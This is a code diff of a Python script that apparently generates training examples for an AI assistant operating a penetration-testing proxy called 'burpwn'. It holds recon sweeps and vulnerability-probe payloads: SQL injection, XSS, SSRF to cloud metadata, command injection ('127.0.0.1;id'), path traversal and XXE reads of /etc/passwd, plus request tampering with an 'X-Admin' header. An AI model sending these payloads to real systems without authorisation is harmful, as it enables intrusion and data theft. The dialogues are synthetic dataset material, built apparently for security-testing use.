+                "final": "Three sessions exist — `default`, `acme`, `shopwave` — and `acme` "
+                         "is active.",
+            }],
+        )
+    )
+    # req_list across targets/filters; MCP result is {flows, count}
+    for t, args, rows in [
+        (_t("restapi"), {"host": "api.shopwave.io", "method": "GET", "status": 200},
+         [{"id": 41, "authority": "api.shopwave.io", "method": "GET", "path": "/v1/me",
+           "status": 200, "protocol": "h2", "scheme": "https", "dst_port": 443}]),
+        (_t("juiceshop"), {"host": "juice-shop.local", "status": 500},
+         [{"id": 88, "authority": "juice-shop.local", "method": "POST",
+           "path": "/rest/products/search", "status": 500, "protocol": "h2"}]),
+        (_t("dvwa"), {"method": "POST"},
+         [{"id": 12, "authority": "dvwa.local", "method": "POST", "path": "/login.php",
+           "status": 302, "protocol": "h1"}]),
+    ]:
+        out.append(
+            mcp_example(
+                tags=["mcp", "req_list", "filter", t.key],
+                user=f"List flows matching {json.dumps(args)} on {t.host}.",
+                steps=[{
+                    "tool": "req_list", "args": args,
+                    "result": {"flows": rows, "count": len(rows)},
+                    "final": f"`count` is {len(rows)}; e.g. flow {rows[0]['id']} "
+                             f"`{rows[0]['method']} {rows[0]['path']}` → "
+                             f"{rows[0]['status']}. Want me to `req_show` it for the decoded "
+                             "request/response?",
+                }],
+            )
+        )
+    out.append(
+        mcp_example(
+            tags=["mcp", "req_show", "raw", "idor"],
+            user="Show me the raw bytes of flow 41 so I can build a PoC.",
+            steps=[{
+                "tool": "req_show", "args": {"id": 41, "raw": True},
+                "result": {
+                    "id": 41, "protocol": "h2",
+                    "request": {"method": "GET", "path": "/v1/me",
+                                "headers": "authorization: Bearer ...\r\n", "body": ""},
+                    "response": {"status": 200, "headers": "content-type: application/json\r\n",
+                                 "body": '{"id":1001,"role":"user"}'},
+                    "raw_request": "GET /v1/me HTTP/2\r\nauthorization: Bearer ...\r\n\r\n",
+                    "raw_response": 'HTTP/2 200\r\ncontent-type: application/json\r\n\r\n'
+                                    '{"id":1001,"role":"user"}',
+                },
+                "final": "Flow 41 is `GET /v1/me` with a bearer token; the JSON exposes "
+                         '`{"id":1001,"role":"user"}`. The `raw_request`/`raw_response` '
+                         "fields are byte-exact. Since the response leaks the numeric user "
+                         "id, this is a strong IDOR candidate on `/v1/users/<id>`.",
+            }],
+        )
+    )
+    for q, ids in [("token", [41, 37, 12]), ("password", [31, 9]), ("flag{", [88])]:
+        out.append(
+            mcp_example(
+                tags=["mcp", "req_search"],
+                user=f"Search captured traffic for anything containing '{q}'.",
+                steps=[{
+                    "tool": "req_search", "args": {"query": q},
+                    "result": {"flow_ids": ids},
+                    "final": f"{len(ids)} flow(s) match '{q}': "
+                             f"{', '.join(map(str, ids))} (newest first). I can `req_show` "
+                             "any of them to read the match in context.",
+                }],
+            )
+        )
+    # exec via MCP
+    out.append(
+        mcp_example(
+            tags=["mcp", "exec", "recon"],
+            user="Curl the juice-shop homepage through the sandbox and tell me what got captured.",
+            steps=[{
+                "tool": "exec",
+                "args": {"argv": ["curl", "-s", "-o", "/dev/null", "https://juice-shop.local/"]},
+                "result": {"exit_code": 0, "captured_request_ids": [50, 51, 52],
+                           "exec_id": "exec-4101-0-1781400000000000000"},
+                "final": "Clean exit (`exit_code:0`); 3 flows captured: 50, 51, 52 (A/AAAA "
+                         "DNS + the HTTPS GET). `req_show` the highest id (52) for the "
+                         "decoded homepage.",
+            }],
+        )
+    )
+    out.append(
+        mcp_example(
+            tags=["mcp", "exec", "timeout", "nuclei"],
+            user="Run a 5-minute nuclei scan against https://api.shopwave.io under the sandbox.",
+            steps=[{
+                "tool": "exec",
+                "args": {"argv": ["nuclei", "-u", "https://api.shopwave.io", "-silent"],
+                         "timeout_secs": 300},
+                "result": {"exit_code": 0, "captured_request_ids": [60, 61, 62, 63, 64],
+                           "exec_id": "exec-4140-1-1781400500000000000"},
+                "final": "nuclei finished within the budget; 5 flows captured (60–64). "
+                         "`req_list` to see which requests it sent and the live responses.",
+            }],
+        )
+    )
+    out.append(
+        mcp_example(
+            tags=["mcp", "match_replace_add", "auth-inject"],
+            user="Inject a bearer token into every request to all hosts.",
+            steps=[{
+                "tool": "match_replace_add",
+                "args": {"scope": "", "kind": "header", "pattern": "Authorization",
+                         "replacement": "Bearer eyJhbGciOi...", "on_request": True},
+                "result": {"id": 1},
+                "final": "Rule 1 added: on every request (empty scope = all hosts) the "
+                         "`Authorization` header is set. New `exec` flows carry it. "
+                         "`on_request:true` targets requests; set `false` to rewrite "
+                         "responses.",
+            }],
+        )
+    )
+    out.append(
+        mcp_example(
+            tags=["mcp", "workspace_new"],
+            user="Create a workspace called login-flow.",
+            steps=[{
+                "tool": "workspace_new", "args": {"name": "login-flow"},
+                "result": {"workspace_id": 3},
+                "final": "Created workspace `login-flow` (workspace_id 3). Pass "
+                         "`workspace:\"3\"` to `exec` to attribute captured flows to it. "
+                         "(Note the MCP result key is `workspace_id`, unlike the CLI's "
+                         "`{id,name}`.)",
+            }],
+        )
+    )
+    out.append(
+        mcp_example(
+            tags=["mcp", "tag_add", "triage"],
+            user="Tag flow 41 as idor.",
+            steps=[{
+                "tool": "tag_add", "args": {"flow_id": 41, "name": "idor"},
+                "result": {"tag_id": 2},
+                "final": "Flow 41 is now tagged `idor` (tag_id 2). The MCP `tag_add` returns "
+                         "just `{tag_id}` (the CLI also echoes flow_id/name).",
+            }],
+        )
+    )
+    out.append(
+        mcp_example(
+            tags=["mcp", "note_add", "triage"],
+            user="Note on flow 41 that /v1/me leaks the numeric user id.",
+            steps=[{
+                "tool": "note_add",
+                "args": {"flow_id": 41,
+                         "body": "/v1/me response leaks numeric user id 1001 -> test IDOR"},
+                "result": {"note_id": 1},
+                "final": "Note saved on flow 41 (note_id 1). The MCP `note_add` argument is "
+                         "`body` (the CLI takes a positional `<TEXT>`).",
+            }],
+        )
+    )
+    out.append(
+        mcp_example(
+            tags=["mcp", "match_replace_list"],
+            user="What rewrite rules are configured?",
+            steps=[{
+                "tool": "match_replace_list", "args": {},
+                "result": {"rules": [{"id": 1, "scope": "", "match_kind": "header",
+                                      "pattern": "Authorization", "replacement": "Bearer ...",
+                                      "on_request": True, "enabled": True}]},
+                "final": "One enabled rule (id 1): on all-host requests, set `Authorization`. "
+                         "There's no MCP tool to delete/disable rules (store supports add + "
+                         "list only), so to clear it restart the session daemon.",
+            }],
         )
     )
     out.append(
         mcp_example(
             tags=["mcp", "workspace_list"],
             user="List the workspaces in this session.",
-            tool_name="workspace_list",
-            tool_args={},
-            tool_result=[
-                {"id": 1, "name": "default", "created_at": 0},
-                {"id": 3, "name": "login-flow", "created_at": 1781363698970},
-            ],
-            assistant_final=(
-                "Two workspaces: `default` (id 1) and `login-flow` (id 3). Use id 3 with "
-                "`exec`'s workspace argument to scope new captures to the login flow."
-            ),
+            steps=[{
+                "tool": "workspace_list", "args": {},
+                "result": {"workspaces": [{"id": 1, "name": "default", "created_at": 0},
+                                          {"id": 3, "name": "login-flow",
+                                           "created_at": 1781363698970}]},
+                "final": "Two workspaces: `default` (id 1) and `login-flow` (id 3). Use id 3 "
+                         "with `exec`'s workspace arg to scope new captures.",
+            }],
         )
     )
     out.append(
         mcp_example(
             tags=["mcp", "tag_list", "triage"],
             user="What tags have I applied so far?",
-            tool_name="tag_list",
-            tool_args={},
-            tool_result=[{"id": 2, "name": "idor"}, {"id": 3, "name": "login-form"}],
-            assistant_final="You've used two tags: `idor` (id 2) and `login-form` (id 3).",
+            steps=[{
+                "tool": "tag_list", "args": {},
+                "result": {"tags": [{"id": 2, "name": "idor"}, {"id": 3, "name": "xss"}]},
+                "final": "Two tags so far: `idor` (id 2) and `xss` (id 3).",
+            }],
+        )
+    )
+    out.append(
+        mcp_example(
+            tags=["mcp", "intercept_enable"],
+            user="Turn on live interception so I can tamper the next request.",
+            steps=[{
+                "tool": "intercept_enable", "args": {},
+                "result": {"ok": True},
+                "final": "Interception enabled (`{ok:true}`). Call `await_intercept` to block "
+                         "for the next parked request, then `intercept_forward` (with edits) "
+                         "or `intercept_drop`.",
+            }],
         )
     )
     out.append(
         mcp_example(
             tags=["mcp", "intercept_list"],
             user="Is anything currently held by the interceptor?",
-            tool_name="intercept_list",
-            tool_args={},
-            tool_result={"type": "Intercepts", "items": []},
-            assistant_final=(
-                "Nothing is parked right now (`items` is empty). Either interception is "
-                "off or no matching request has arrived yet — enable it with "
-                "`intercept_enable` and `await_intercept` for the next one."
-            ),
+            steps=[{
+                "tool": "intercept_list", "args": {},
+                "result": {"intercepts": []},
+                "final": "Nothing parked right now (`intercepts` is empty). Either "
+                         "interception is off or no request has arrived — `intercept_enable` "
+                         "then `await_intercept` for the next one.",
+            }],
         )
     )
     out.append(
         mcp_example(
             tags=["mcp", "intercept_disable"],
             user="Disable interception, I'm done.",
-            tool_name="intercept_disable",
-            tool_args={},
-            tool_result={"type": "Ack"},
-            assistant_final=(
-                "Interception is now off (`Ack`); traffic flows through normally and is "
-                "still captured."
-            ),
+            steps=[{
+                "tool": "intercept_disable", "args": {},
+                "result": {"ok": True},
+                "final": "Interception off (`{ok:true}`); traffic flows normally and is "
+                         "still captured.",
+            }],
         )
     )
     out.append(
         mcp_example(
-            tags=["mcp", "req_list", "pagination"],
-            user="Give me the 25 newest flows.",
-            tool_name="req_list",
-            tool_args={"limit": 25},
-            tool_result=[
-                {"id": 64, "authority": "acme.com", "method": "GET", "path": "/", "status": 200, "protocol": "h2"},
-                {"id": 63, "authority": "acme.com", "method": "POST", "path": "/auth", "status": 302, "protocol": "h2"},
-            ],
-            assistant_final=(
-                "Newest flows (showing the top of 25): id 64 `GET /` → 200, and id 63 "
-                "`POST /auth` → 302 (a redirect after login). The 302 on `/auth` is worth "
-                "a `req_show` to see the Set-Cookie/session handling."
-            ),
+            tags=["mcp", "await_intercept", "timeout", "negative"],
+            user="Wait up to 5s for a parked request.",
+            steps=[{
+                "tool": "await_intercept", "args": {"timeout_secs": 5},
+                "result": {"pending": False},
+                "final": "`{pending:false}` — nothing parked in the 5s window (the long-poll "
+                         "timed out). Trigger traffic and call `await_intercept` again. "
+                         "(Over MCP, timeout is `{pending:false}`, not the CLI's "
+                         "`{type:Pending,item:null}`.)",
+            }],
         )
     )
-
+    out.append(
+        mcp_example(
+            tags=["mcp", "intercept_drop"],
+            user="Drop parked intercept 2 — it's a telemetry beacon I don't want sent.",
+            steps=[{
+                "tool": "intercept_drop", "args": {"id": 2},
+                "result": {"found": True},
+                "final": "Dropped intercept 2 (`found:true`); it will not be forwarded. If "
+                         "`found` were false, the id was already resolved or never parked.",
+            }],
+        )
+    )
+    out.append(
+        mcp_example(
+            tags=["mcp", "intercept", "no-daemon", "negative"],
+            user="List parked intercepts.",
+            steps=[{
+                "tool": "intercept_list", "args": {},
+                "result": {"error": "no burpwn proxy daemon answering on "
+                                    "/run/user/1000/burpwn/acme/control.sock for session "
+                                    "'acme'. Start it by running a command through the "
+                                    "sandbox, e.g. the `exec` tool or `burpwn exec -- <cmd>`."},
+                "final": "No proxy daemon is running for this session yet. Spawn it by "
+                         "running any command through the sandbox first — call `exec` with "
+                         "e.g. `argv:[\"curl\",\"-s\",\"https://acme.com/\"]` — then "
+                         "`intercept_list`/`await_intercept` will connect.",
+            }],
+        )
+    )
     return out
 
 
 # --------------------------------------------------------------------------- #
-# Assembly / validation.
+# MCP multi-turn tool chains (several call/result/interpret rounds).
 # --------------------------------------------------------------------------- #
 
 
-def all_records() -> list[dict[str, Any]]:
-    return cli_records() + mcp_records()
+def fam_mcp_multi() -> list[dict[str, Any]]:
+    out: list[dict[str, Any]] = []
+
+    # exec -> req_list -> req_show -> tag_add (IDOR discovery)
+    out.append(
+        mcp_example(
+            tags=["mcp", "multi-step", "idor", "restapi"],
+            user="Probe the shopwave API's /v1/me, find what it leaks, and flag it if it's IDOR-prone.",
+            steps=[
+                {
+                    "preamble": "First I'll hit the endpoint through the sandbox so it's captured.",
+                    "tool": "exec",
+                    "args": {"argv": ["curl", "-s", "-o", "/dev/null",
+                                      "https://api.shopwave.io/v1/me"]},
+                    "result": {"exit_code": 0, "captured_request_ids": [40, 41],
+                               "exec_id": "exec-9-0-1781400900000000000"},
+                    "final": "Captured flows 40 (DNS) and 41 (the HTTPS GET). Let me inspect "
+                             "flow 41.",
+                },
+                {
+                    "preamble": "Decode flow 41's request/response.",
+                    "tool": "req_show", "args": {"id": 41},
+                    "result": {"id": 41, "protocol": "h2",
+                               "request": {"method": "GET", "path": "/v1/me"},
+                               "response": {"status": 200,
+                                            "body": '{"id":1001,"role":"user"}'}},
+                    "final": "`/v1/me` returns `{\"id\":1001,...}` — a numeric, "
+                             "guessable user id, so `/v1/users/1001` is likely IDOR-prone. "
+                             "I'll flag this flow.",
+                },
+                {
+                    "preamble": "Tag flow 41 for follow-up.",
+                    "tool": "tag_add", "args": {"flow_id": 41, "name": "idor-candidate"},
+                    "result": {"tag_id": 2},
+                    "final": "Tagged flow 41 `idor-candidate` (tag_id 2). Next step: `exec` a "
+                             "request to `/v1/users/1002` with the same token and compare.",
+                },
+            ],
+        )
+    )
+
+    # intercept enable -> await -> forward (tamper)
+    out.append(
+        mcp_example(
+            tags=["mcp", "multi-step", "intercept", "tamper"],
+            user="Tamper the next checkout request: enable interception, grab it, bump qty to 99 and add X-Admin.",
+            steps=[
+                {
+                    "preamble": "Enable interception so the next request parks.",
+                    "tool": "intercept_enable", "args": {},
+                    "result": {"ok": True},
+                    "final": "Interception on. Now I'll long-poll for the next request.",
+                },
+                {
+                    "preamble": "Block up to 60s for the next parked request.",
+                    "tool": "await_intercept", "args": {"timeout_secs": 60},
+                    "result": {"pending": True,
+                               "intercept": {"id": 1, "kind": "request",
+                                             "host": "shopwave.io", "method": "POST",
+                                             "path": "/cart/checkout"}},
+                    "final": "Parked: intercept id 1, `POST shopwave.io/cart/checkout`. I'll "
+                             "forward it with the tampered body and admin header.",
+                },
+                {
+                    "preamble": "Forward intercept 1 with edits.",
+                    "tool": "intercept_forward",
+                    "args": {"id": 1,
+                             "set_headers": [{"name": "X-Admin", "value": "true"}],
+                             "set_body": '{"item":"sku-9","qty":99}'},
+                    "result": {"found": True},
+                    "final": "Released intercept 1 with `X-Admin:true` and `qty:99` "
+                             "(`found:true`). The tampered request hit the server and is "
+                             "captured; `req_list` to see its response. Note the MCP "
+                             "`intercept_forward` takes `set_headers:[{name,value}]` and "
+                             "`set_body` (no method override — use the CLI for that).",
+                },
+            ],
+        )
+    )
+
+    # search -> show (credential leak hunt)
+    out.append(
+        mcp_example(
+            tags=["mcp", "multi-step", "search", "creds"],
+            user="Did any captured response leak a password? If so show me the flow.",
+            steps=[
+                {
+                    "preamble": "Search bodies for 'password'.",
+                    "tool": "req_search", "args": {"query": "password"},
+                    "result": {"flow_ids": [31]},
+                    "final": "One hit: flow 31. Let me read it.",
+                },
+                {
+                    "preamble": "Decode flow 31.",
+                    "tool": "req_show", "args": {"id": 31, "raw": True},
+                    "result": {"id": 31, "protocol": "h1",
+                               "response": {"status": 200,
+                                            "body": '{"user":"admin","password":"P@ss"}'},
+                               "raw_response": 'HTTP/1.1 200 OK\r\n\r\n'
+                                               '{"user":"admin","password":"P@ss"}'},
+                    "final": "Flow 31's response body returns a cleartext credential "
+                             "(`password:\"P@ss\"`) — a sensitive-data-exposure finding. "
+                             "Recommend `tag_add` it and capture the raw response as "
+                             "evidence.",
+                },
+            ],
+        )
+    )
+
+    # session_current -> req_list -> req_search (orientation)
+    out.append(
+        mcp_example(
+            tags=["mcp", "multi-step", "orientation"],
+            user="I just connected. Orient me: which session, how many flows, any JWTs?",
+            steps=[
+                {
+                    "preamble": "Check the active session.",
+                    "tool": "session_current", "args": {},
+                    "result": {"active": "shopwave", "db_exists": True},
+                    "final": "Active session is `shopwave` and its db exists. Let me see the "
+                             "recent flows.",
+                },
+                {
+                    "preamble": "List the newest flows.",
+                    "tool": "req_list", "args": {"limit": 5},
+                    "result": {"flows": [
+                        {"id": 64, "authority": "api.shopwave.io", "method": "GET",
+                         "path": "/v1/me", "status": 200, "protocol": "h2"},
+                        {"id": 63, "authority": "api.shopwave.io", "method": "POST",
+                         "path": "/v1/login", "status": 200, "protocol": "h2"}],
+                              "count": 2},
+                    "final": "2 recent flows, including a `POST /v1/login` (63) and "
+                             "`GET /v1/me` (64). Let me check for JWTs.",
+                },
+                {
+                    "preamble": "Search for bearer/JWT material.",
+                    "tool": "req_search", "args": {"query": "Bearer OR eyJ"},
+                    "result": {"flow_ids": [64, 63]},
+                    "final": "Both flows carry Bearer/JWT material (ids 64, 63). The login "
+                             "(63) likely issues the token and `/v1/me` (64) consumes it — "
+                             "good starting point for JWT and authz testing.",
+                },
+            ],
+        )
+    )
+    return out
 
 
-def emit(records: Iterable[dict[str, Any]]) -> None:
+# --------------------------------------------------------------------------- #
+# Scaled families — systematic sweeps over the realistic parameter space.
+#
+# These produce the bulk of the dataset. Each example is a *distinct* plausible
+# scenario (a different target / tool / vuln / flag / phrasing combination), not
+# trivial padding: the natural-language phrasing varies per axis value and the
+# grounded command/envelope is recomputed for each combination. Dedup in
+# build_dataset() drops any accidental collisions.
+# --------------------------------------------------------------------------- #
+
+# Varied user phrasings for "run TOOL against TARGET" recon, parameterized.
+_RECON_PHRASINGS = [
+    "Run {tool} against {host} through burpwn so the traffic is captured.",
+    "I want to {desc} on {host}. Drive {tool} through the sandbox.",
+    "Use {tool} to {desc} {host} — capture everything.",
+    "Kick off {tool} on {host} under burpwn's proxy.",
+    "Can you {desc} {host} with {tool} and route it through burpwn?",
+    "Let's {desc} {host}. Wrap {tool} in burpwn exec.",
+    "Fire {tool} at {host} through the sandbox and capture the requests.",
+]
+
+# (tool, command template, timeout, short-desc, follow-up note template)
+_RECON_TOOLS = [
+    ("ffuf", "ffuf -u {base}/FUZZ -w /usr/share/wordlists/common.txt -mc 200,301,302,403",
+     600, "do content discovery against",
+     "Triage hits: `burpwn req list --host {host} --status 200`."),
+    ("gobuster", "gobuster dir -u {base} -w /usr/share/wordlists/common.txt",
+     600, "brute-force directories on",
+     "Review found paths with `burpwn req list --host {host}`."),
+    ("feroxbuster", "feroxbuster -u {base} -w /usr/share/wordlists/common.txt --silent",
+     600, "recursively discover content on",
+     "Inspect recursion hits: `burpwn req list --host {host} --status 200`."),
+    ("dirb", "dirb {base} /usr/share/wordlists/common.txt -S",
+     600, "enumerate directories on",
+     "Each request is captured; filter with `burpwn req list --host {host}`."),
+    ("nuclei", "nuclei -u {base} -silent",
+     300, "run a templated vuln scan on",
+     "See what nuclei sent: `burpwn req list --host {host}`."),
+    ("nikto", "nikto -h {base}",
+     600, "run a Nikto scan on",
+     "`burpwn req search` the captured responses for the issues Nikto flags."),
+    ("katana", "katana -u {base} -silent",
+     300, "crawl",
+     "Triage discovered endpoints: `burpwn req list --host {host}`."),
+    ("httpx", "httpx -u {base} -sc -title -silent",
+     120, "probe and fingerprint",
+     "The probe flow is captured; `burpwn req show <id>` for headers/title."),
+    ("wpscan", "wpscan --url {base} --no-update --enumerate p",
+     600, "scan WordPress on",
+     "WPScan's enumeration requests are captured for later review."),
+    ("nmap", "nmap -sT -Pn -p- {host}",
+     900, "port-scan",
+     "nmap's connects appear as `rawtcp`/`dns` flows: "
+     "`burpwn req list --protocol rawtcp --host {host}`."),
+    ("sqlmap", "sqlmap -u {base}/item?id=1 --batch --level 2",
+     900, "test for SQL injection on",
+     "All sqlmap payloads are captured: `burpwn req search` for the injected markers."),
+    ("curl", "curl -s -o /dev/null -w '%{{http_code}}' {base}/",
+     60, "fetch the homepage of",
+     "Then `burpwn req list --host {host} --limit 5` to see the captured flow."),
+    ("wget", "wget -q -O /dev/null {base}/robots.txt",
+     60, "grab robots.txt from",
+     "`burpwn req show <id>` to read the captured robots.txt response."),
+    ("http", "http GET {base}/api/health",
+     60, "check the health endpoint of",
+     "`burpwn req show <id>` for the decoded JSON health response."),
+]
+
+
+# Per-tool option axes — distinct, realistic invocation variants.
+_TOOL_OPTION_AXES = {
+    "ffuf": ["-mc 200,301,302,403", "-mc all -fc 404", "-fs 0 -t 50",
+             "-e .php,.bak,.old -mc 200"],
+    "gobuster": ["", "-x php,txt", "-s 200,204,301,302,307 -b ''"],
+    "feroxbuster": ["--silent", "--silent -x php,html", "--silent -d 2"],
+    "dirb": ["-S", "-S -X .php,.bak", "-S -r"],
+    "nuclei": ["-silent", "-severity high,critical -silent", "-tags cve,exposure -silent"],
+    "nikto": ["", "-Tuning 1,2,3", "-ssl"],
+    "katana": ["-silent", "-silent -jc", "-silent -d 3"],
+    "httpx": ["-sc -title -silent", "-sc -tech-detect -silent", "-sc -location -silent"],
+    "wpscan": ["--no-update --enumerate p", "--no-update --enumerate u",
+               "--no-update --enumerate vp"],
+    "nmap": ["-sT -Pn", "-sT -Pn -p 80,443,8080,8443", "-sT -Pn --top-ports 100"],
+    "sqlmap": ["--batch", "--batch --level 2 --risk 2", "--batch --dbs"],
+    "curl": ["-s -o /dev/null -w '%{{http_code}}'", "-s -I", "-s -L"],
+    "wget": ["-q -O /dev/null", "-q -O - --max-redirect 0", "-q --spider"],
+    "http": ["GET", "GET --verify=no", "HEAD"],
+}
+
+
+def fam_recon_sweep() -> list[dict[str, Any]]:
+    """target x tool x option x phrasing recon sweep (volume backbone).
+
+    Each emitted example is a genuinely distinct invocation: a different target,
+    tool, realistic option set, and phrasing. Dedup guarantees uniqueness."""
+    out: list[dict[str, Any]] = []
+    n = 0
+    for ti, t in enumerate(TARGETS):
+        for tj, (tool, cmdpat, to, desc, notepat) in enumerate(_RECON_TOOLS):
+            opts = _TOOL_OPTION_AXES.get(tool, [""])
+            for oi, opt in enumerate(opts):
+                phrasing = _RECON_PHRASINGS[n % len(_RECON_PHRASINGS)]
+                base_cmd = cmdpat.format(base=t.base, host=t.host)
+                # Splice the option axis into the command in a tool-aware way.
+                if tool == "http":
+                    cmd = f"http {opt} {t.base}/api/health"
+                elif tool in ("curl", "wget"):
+                    target_part = base_cmd.split(" ", 1)[1] if " " in base_cmd else ""
+                    # rebuild: <tool> <opt> <url-or-tail>
+                    url = base_cmd.rsplit(" ", 1)[-1]
+                    cmd = f"{tool} {opt} {url}".replace("  ", " ").strip()
+                else:
+                    cmd = f"{base_cmd} {opt}".strip()
+                note = notepat.format(host=t.host)
+                user = phrasing.format(tool=tool, host=t.host, desc=desc)
+                timeout_clause = f"--timeout {to} " if to >= 120 else ""
+                out.append(
+                    cli_example(
+                        tags=["exec", "recon", "sweep", tool, t.key, t.kind],
+                        turns=[
+                            ("user", user),
+                            (
+                                "assistant",
+                                f"Wrap {tool} after `--` so its egress is forced through the "
+                                f"proxy and captured:\n\n```\nburpwn exec {timeout_clause}-- "
+                                f"{cmd}\n```\n\n{note}",
+                            ),
+                        ],
+                    )
+                )
+                n += 1
+    return out
+
+
+# Vuln-test recon: deliberate payloads per vuln class x target, with a probe and
+# an interpretation of what to look for.
+_VULN_PROBES = [
+    ("sqli", "SQL injection",
+     "curl -s '{base}/product?id=1%27'",
+     "Look for a SQL error or changed response — then confirm with sqlmap. Tag the "
+     "flow `sqli`."),
+    ("xss-reflected", "reflected XSS",
+     "curl -s '{base}/search?q=xss<svg/onload=alert(1)>'",
+     "`burpwn req search` for the marker and `req show --raw` to check if it's reflected "
+     "unencoded into HTML/JS. Tag `xss`."),
+    ("ssrf", "SSRF",
+     "curl -s '{base}/fetch?url=http://169.254.169.254/latest/meta-data/'",
+     "Search the response for metadata content; if present the server fetched the internal "
+     "URL. Tag `ssrf`."),
+    ("open-redirect", "an open redirect",
+     "curl -s -o /dev/null -D - '{base}/login?next=https://evil.example/'",
+     "Check the captured `Location` header — an external host means an open redirect. Tag "
+     "`open-redirect`."),
+    ("path-traversal", "path traversal",
+     "curl -s '{base}/download?file=../../../../etc/passwd'",
+     "Search the response body for `root:` to confirm file read. Tag `lfi`."),
+    ("idor", "IDOR/BOLA",
+     "curl -s -H 'Authorization: Bearer $TOKEN' '{base}/api/users/1002'",
+     "Compare against your own user's response; same data for another id = IDOR. Tag "
+     "`idor`."),
+    ("cmdi", "command injection",
+     "curl -s '{base}/ping?host=127.0.0.1;id'",
+     "Search the response for `uid=` to confirm command execution. Tag `cmdi`."),
+    ("xxe", "XXE",
+     "curl -s -X POST '{base}/upload' -H 'Content-Type: application/xml' "
+     "--data '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM "
+     "\"file:///etc/passwd\">]><r>&x;</r>'",
+     "Inspect the response for the file contents reflected back. Tag `xxe`."),
+]
+
+
+# Multiple distinct payload variants per vuln class.
+_VULN_PAYLOAD_AXES = {
+    "sqli": ["id=1%27", "id=1%20OR%201=1", "id=1%27%20UNION%20SELECT%20NULL--",
+             "id=1%27%3BWAITFOR%20DELAY%20%270:0:5%27--"],
+    "xss-reflected": ["q=xss<svg/onload=alert(1)>", "q=%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
+                      "q=javascript:alert(document.domain)", "q=<img src=x onerror=alert(1)>"],
+    "ssrf": ["url=http://169.254.169.254/latest/meta-data/",
+             "url=http://127.0.0.1:8080/admin", "url=file:///etc/passwd",
+             "url=http://[::1]:6379/"],
+    "open-redirect": ["next=https://evil.example/", "redirect=//evil.example",
+                      "url=https:evil.example", "return=/%09/evil.example"],
+    "path-traversal": ["file=../../../../etc/passwd", "file=..%2f..%2f..%2fetc%2fpasswd",
+                       "page=....//....//etc/passwd", "file=/etc/passwd%00.png"],
+    "idor": ["1002", "1003", "../1004", "0"],
+    "cmdi": ["host=127.0.0.1;id", "host=127.0.0.1|id", "host=$(id)", "host=127.0.0.1%0aid"],
+    "xxe": ["file:///etc/passwd", "http://169.254.169.254/", "file:///etc/hostname",
+            "expect://id"],
+}
+
+
+def fam_vuln_probe_sweep() -> list[dict[str, Any]]:
+    """vuln-class x target x payload-variant probe sweep."""
+    out: list[dict[str, Any]] = []
+    probe_targets = [t for t in TARGETS if t.kind in ("webapp", "spa", "rest", "internal")]
+    n = 0
+    for vi, (vkey, vname, cmdpat, note) in enumerate(_VULN_PROBES):
+        payloads = _VULN_PAYLOAD_AXES.get(vkey, [None])
+        for ti, t in enumerate(probe_targets):
+            for pi, payload in enumerate(payloads):
+                # Re-template the command with the payload variant where it has a
+                # clear injection point; otherwise fall back to the base command.
+                if payload is not None and vkey in ("sqli", "xss-reflected",
+                                                    "open-redirect", "path-traversal"):
+                    # cmdpat ends with a querystring after '?'
+                    cmd = cmdpat.format(base=t.base)
+                    if "?" in cmd:
+                        head = cmd.rsplit("?", 1)[0]
+                        cmd = f"{head}?{payload}'"
+                        # close any opened quote consistently
+                        cmd = cmd.replace("?" + payload + "'", "?" + payload).rstrip("'")
+                        cmd = head + "?" + payload + (cmd[-1] if cmd.endswith("'") else "")
+                        cmd = f"curl -s '{head}?{payload}'"
+                elif payload is not None and vkey == "idor":
+                    cmd = (f"curl -s -H 'Authorization: Bearer $TOKEN' "
+                           f"'{t.base}/api/users/{payload}'")
+                elif payload is not None and vkey == "ssrf":
+                    cmd = f"curl -s '{t.base}/fetch?{payload}'"
+                elif payload is not None and vkey == "cmdi":
+                    cmd = f"curl -s '{t.base}/ping?{payload}'"
+                elif payload is not None and vkey == "xxe":
+                    cmd = (f"curl -s -X POST '{t.base}/upload' -H 'Content-Type: "
+                           f"application/xml' --data '<?xml version=\"1.0\"?><!DOCTYPE r "
+                           f"[<!ENTITY x SYSTEM \"{payload}\">]><r>&x;</r>'")
+                else:
+                    cmd = cmdpat.format(base=t.base)
+                phr = [
+                    f"Test {t.host} for {vname} through the sandbox.",
+                    f"Probe {t.host} for {vname} and capture it.",
+                    f"I suspect {vname} on {t.host} — fire a probe via burpwn.",
+                    f"Check {t.host}'s parameters for {vname}.",
+                    f"Send a {vname} payload at {t.host} through burpwn.",
+                ][n % 5]
+                out.append(
+                    cli_example(
+                        tags=["exec", "vuln", vkey, t.key],
+                        turns=[
+                            ("user", phr),
+                            (
+                                "assistant",
+                                f"Send the probe through the sandbox so the request and "
+                                f"response are captured:\n\n```\nburpwn exec -- {cmd}\n```\n\n"
+                                f"{note}",
+                            ),
+                        ],
+                    )
+                )
+                n += 1
+    return out
+
+
+def fam_req_list_sweep() -> list[dict[str, Any]]:
+    """target x filter sweep for `req list`."""
+    out: list[dict[str, Any]] = []
+    filters = [
+        ("--host {host}", "all flows to {host}"),
+        ("--host {host} --status 200", "successful (200) flows to {host}"),
+        ("--host {host} --status 401", "unauthorized (401) flows to {host}"),
+        ("--host {host} --status 403", "forbidden (403) flows to {host}"),
+        ("--host {host} --status 404", "not-found (404) flows to {host}"),
+        ("--host {host} --status 500", "server errors (500) to {host}"),
+        ("--host {host} --status 302", "redirects (302) on {host}"),
+        ("--host {host} --method POST", "POST requests to {host}"),
+        ("--host {host} --method GET --status 200", "successful GETs to {host}"),
+        ("--host {host} --method PUT", "PUT requests to {host}"),
+        ("--host {host} --method DELETE", "DELETE requests to {host}"),
+        ("--host {host} --protocol h1", "HTTP/1.1 flows to {host}"),
+        ("--host {host} --protocol h2", "HTTP/2 flows to {host}"),
+        ("--host {host} --protocol ws", "websocket flows for {host}"),
+        ("--host {host} --protocol dns", "DNS lookups for {host}"),
+        ("--host {host} --protocol tls-passthru", "cert-pinned (tls-passthru) flows for {host}"),
+        ("--host {host} --limit 10", "the 10 newest flows to {host}"),
+        ("--host {host} --limit 25 --offset 25", "flows 25-50 for {host}"),
+    ]
+    for ti, t in enumerate(TARGETS):
+        for fi, (flags, what) in enumerate(filters):
+            fl = flags.format(host=t.host)
+            whatr = what.format(host=t.host)
+            phr = [
+                f"Show me {whatr}.",
+                f"List {whatr}.",
+                f"Give me {whatr}.",
+                f"I want to see {whatr}.",
+            ][(ti + fi) % 4]
+            out.append(
+                cli_example(
+                    tags=["req", "list", "filter", "sweep", t.key],
+                    turns=[
